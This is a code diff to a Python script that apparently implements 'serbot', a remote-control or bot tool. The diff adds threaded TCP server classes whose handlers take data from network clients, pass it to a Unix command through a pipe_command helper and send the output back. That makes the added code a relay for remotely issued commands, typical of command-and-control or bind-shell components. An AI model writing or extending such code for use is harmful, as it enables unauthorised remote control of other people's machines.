@@ -4,6 +4,7 @@
 import argparse
 import os
 from socket import *
+import SocketServer
 import sys
 import threading
 import time
@@ -21,6 +22,33 @@ Twitter: https://twitter.com/dotcppfile
 Blog: http://dotcppfile.worpdress.com"
 """
 
+class ClientTCPHandler(SocketServer.BaseRequestHandler):
+    "One instance per connection.  Override handle(self) to customize action."
+    def handle(self):
+		# self.request is the client connection
+		data = self.request.recv(20480)
+		reply = pipe_command(my_unix_command, data)
+		if reply is not None:
+			self.request.send(reply)
+		#self.request.close()
+		
+class BridgeTCPHandler(SocketServer.BaseRequestHandler):
+    def handle(self):
+        data = self.request.recv(20480)
+        reply = pipe_command(my_unix_command, data)
+        if reply is not None:
+            self.request.send(reply)
+        self.request.close()
+	
+class SocServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
+    # Ctrl-C will cleanly kill all spawned threads
+    daemon_threads = True
+    # much faster rebinding
+    allow_reuse_address = True
+
+    def __init__(self, server_address, RequestHandlerClass):
+        SocketServer.TCPServer.__init__(self, server_address, RequestHandlerClass )
+        
 class serbot():
 	def __init__(self):
 		self.allConnections = []
